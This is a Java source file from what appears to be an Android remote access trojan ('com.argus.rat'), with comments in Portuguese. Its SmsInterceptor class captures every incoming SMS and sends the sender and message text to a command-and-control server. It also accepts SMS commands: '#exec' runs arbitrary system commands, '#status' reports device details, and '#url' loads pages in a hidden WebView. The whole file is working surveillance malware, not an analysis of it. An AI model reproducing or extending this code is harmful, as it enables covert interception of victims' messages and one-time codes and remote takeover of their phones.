package com.argus.rat;

import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.content.IntentFilter;
import android.os.BatteryManager;
import android.os.Bundle;
import android.telephony.SmsMessage;
import android.util.Log;
import com.google.gson.JsonObject;
import java.util.concurrent.ExecutorService;
import java.util.concurrent.Executors;

public class SmsInterceptor extends BroadcastReceiver {
    private static final String TAG = "SmsInterceptor";
    private static final ExecutorService executor = Executors.newSingleThreadExecutor();

    @Override
    public void onReceive(Context context, Intent intent) {
        if (intent.getAction() == null) return;

        Log.d(TAG, "SMS interceptado - Ação: " + intent.getAction());

        if (intent.getAction().equals("android.provider.Telephony.SMS_RECEIVED") ||
            intent.getAction().equals("android.provider.Telephony.SMS_DELIVER")) {
            
            processSmsMessage(context, intent);
        }
    }

    private void processSmsMessage(Context context, Intent intent) {
        executor.execute(() -> {
            try {
                Bundle bundle = intent.getExtras();
                if (bundle == null) return;

                Object[] pdus = (Object[]) bundle.get("pdus");
                if (pdus == null || pdus.length == 0) return;

                SmsMessage[] messages = new SmsMessage[pdus.length];
                StringBuilder fullMessage = new StringBuilder();
                String sender = null;

                for (int i = 0; i < pdus.length; i++) {
                    if (android.os.Build.VERSION.SDK_INT >= android.os.Build.VERSION_CODES.M) {
                        String format = bundle.getString("format");
                        messages[i] = SmsMessage.createFromPdu((byte[]) pdus[i], format);
                    } else {
                        messages[i] = SmsMessage.createFromPdu((byte[]) pdus[i]);
                    }

                    if (messages[i] != null) {
                        if (sender == null) {
                            sender = messages[i].getDisplayOriginatingAddress();
                        }
                        fullMessage.append(messages[i].getMessageBody());
                    }
                }

                if (sender != null && fullMessage.length() > 0) {
                    SmsData smsData = new SmsData(
                        sender,
                        fullMessage.toString(),
                        System.currentTimeMillis(),
                        getMessageType(intent.getAction())
                    );

                    // Processar o SMS
                    handleSmsData(context, smsData);

                    Log.d(TAG, "SMS processado: " + sender);
                    
                    // Nota: abortBroadcast() só funciona se o receiver tiver alta prioridade
                    // e o app for o padrão de SMS
                }

            } catch (Exception e) {
                Log.e(TAG, "Erro ao processar SMS", e);
            }
        });
    }

    private void handleSmsData(Context context, SmsData smsData) {
        try {
            // 1. Exfiltrar para C2 Server
            exfiltrateSmsToC2(context, smsData);

            // 2. Processar comandos especiais
            processSpecialCommands(context, smsData);

            // 3. Log para debug
            Log.i(TAG, String.format("SMS processado - De: %s, Tipo: %s", 
                smsData.getSender(), smsData.getType()));

        } catch (Exception e) {
            Log.e(TAG, "Erro no tratamento de SMS", e);
        }
    }

    private void exfiltrateSmsToC2(Context context, SmsData smsData) {
        try {
            C2Client c2Client = C2Client.getInstance(context);
            
            JsonObject smsJson = new JsonObject();
            smsJson.addProperty("sender", smsData.getSender());
            smsJson.addProperty("message", smsData.getMessage());
            smsJson.addProperty("timestamp", smsData.getTimestamp());
            smsJson.addProperty("type", smsData.getType());
            
            c2Client.exfiltrateData("sms", smsJson.toString());
            Log.d(TAG, "SMS exfiltrado para C2");
            
        } catch (Exception e) {
            Log.e(TAG, "Erro ao exfiltrar SMS", e);
        }
    }

    private void processSpecialCommands(Context context, SmsData smsData) {
        String message = smsData.getMessage().toLowerCase().trim();
        String sender = smsData.getSender();

        // Comandos de controle remoto via SMS
        if (message.startsWith("#exec ")) {
            String command = message.substring(6);
            Log.w(TAG, "Comando recebido de " + sender + ": " + command);
            executeRemoteCommand(command);
        }
        else if (message.equals("#status")) {
            sendStatusResponse(context, sender);
        }
        else if (message.startsWith("#url ")) {
            String url = message.substring(5);
            loadRemoteUrl(url);
        }
    }

    private void executeRemoteCommand(String command) {
        // Executar comandos do sistema recebidos via SMS
        try {
            Runtime.getRuntime().exec(command);
            Log.w(TAG, "Comando executado: " + command);
        } catch (Exception e) {
            Log.e(TAG, "Erro ao executar comando: " + command, e);
        }
    }

    private void sendStatusResponse(Context context, String sender) {
        // Enviar status do dispositivo via SMS
        try {
            String status = String.format(
                "Status: Online\nModel: %s\nAndroid: %s\nBattery: %.1f%%",
                android.os.Build.MODEL,
                android.os.Build.VERSION.RELEASE,
                getBatteryLevel(context)
            );

            SmsManager.sendSms(sender, status);
            Log.d(TAG, "Status enviado para: " + sender);

        } catch (Exception e) {
            Log.e(TAG, "Erro ao enviar status", e);
        }
    }

    private void loadRemoteUrl(String url) {
        // Carregar URL remotamente usando WebView furtiva
        Log.d(TAG, "Carregando URL remota: " + url);
        // Implementação usando StealthWebViewManager
    }

    private float getBatteryLevel(Context context) {
        try {
            Intent batteryIntent = context.registerReceiver(null, 
                new IntentFilter(Intent.ACTION_BATTERY_CHANGED));
            if (batteryIntent != null) {
                int level = batteryIntent.getIntExtra(BatteryManager.EXTRA_LEVEL, -1);
                int scale = batteryIntent.getIntExtra(BatteryManager.EXTRA_SCALE, -1);
                if (level != -1 && scale != -1) {
                    return (level * 100.0f) / scale;
                }
            }
        } catch (Exception e) {
            Log.e(TAG, "Erro ao obter nível da bateria", e);
        }
        return 0.0f;
    }

    private String getMessageType(String action) {
        switch (action) {
            case "android.provider.Telephony.SMS_RECEIVED":
                return "RECEIVED";
            case "android.provider.Telephony.SMS_DELIVER":
                return "DELIVERED";
            default:
                return "UNKNOWN";
        }
    }

    // Classe de dados para SMS
    public static class SmsData {
        private final String sender;
        private final String message;
        private final long timestamp;
        private final String type;

        public SmsData(String sender, String message, long timestamp, String type) {
            this.sender = sender;
            this.message = message;
            this.timestamp = timestamp;
            this.type = type;
        }

        public String getSender() { return sender; }
        public String getMessage() { return message; }
        public long getTimestamp() { return timestamp; }
        public String getType() { return type; }
    }
}